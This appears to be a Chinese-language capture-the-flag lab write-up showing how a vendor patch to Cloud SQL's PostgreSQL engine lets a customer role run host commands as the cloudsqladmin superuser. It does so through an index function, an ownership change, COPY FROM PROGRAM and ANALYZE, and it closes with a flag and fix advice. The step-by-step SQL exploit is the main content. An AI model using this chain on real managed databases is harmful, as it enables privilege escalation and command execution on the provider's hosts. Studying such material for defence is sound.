# CLOUD-25 Cloud SQL 引擎补丁：索引函数以供应商角色执行

## 场景概述
供应商修改了 PostgreSQL 引擎：客户管理员角色（cloudsqluser）拥有
"可把任意表属主改为 cloudsqladmin"的补丁能力；而 ANALYZE 会以表属主
身份重新求值索引表达式函数。把两者串起来即可让攻击者函数以供应商
超级角色执行宿主命令。

## 教材锚点
- 案例：GCP Cloud SQL 逃逸到宿主（#052）
- 平面：数据面（SQL）→ 宿主 RCE → 失败边界：宿主机
- 六镜头：MAGIC（供应商对引擎的补丁代码是攻击面）；
  IDENTITY（索引函数继承表属主身份）

## 前置知识
- PostgreSQL：索引表达式、ANALYZE、表属主、VOLATILE/IMMUTABLE 函数
- 托管数据库角色阶梯：客户角色 < 供应商超级角色 < 宿主 OS

## 利用步骤
1. 建表并建一个无害 IMMUTABLE 函数和索引（让索引合法建立）：
   ```sql
   CREATE TABLE temp_table (data text);
   INSERT INTO temp_table VALUES ('dummy');
   CREATE FUNCTION suid(text) RETURNS text IMMUTABLE
     AS 'SELECT ''nothing''' LANGUAGE sql;
   CREATE INDEX idx_malicious ON temp_table (suid(data));
   ```
2. 把表属主改成供应商超级角色（引擎补丁允许）：
   ```sql
   ALTER TABLE temp_table OWNER TO cloudsqladmin;
   ```
3. 把函数体换成 VOLATILE 宿主命令：
   ```sql
   CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS
     $$ COPY public.shell_commands_results (data) FROM PROGRAM 'cat /host_flag.txt';
        SELECT 'done' $$ LANGUAGE sql;
   ```
4. 触发 `ANALYZE public.temp_table;` ——控制台会以 cloudsqladmin 身份
   重新求值索引函数，命令输出写入 shell_commands_results。
5. `SELECT * FROM shell_commands_results;` 得到宿主 flag。

## Flag
`flag{cloud-25-host-rce}`

## 修复建议
客户角色不允许改表属主为供应商角色；ANALYZE 不得以表属主身份执行
任意函数；宿主命令执行能力必须从引擎层剥离。
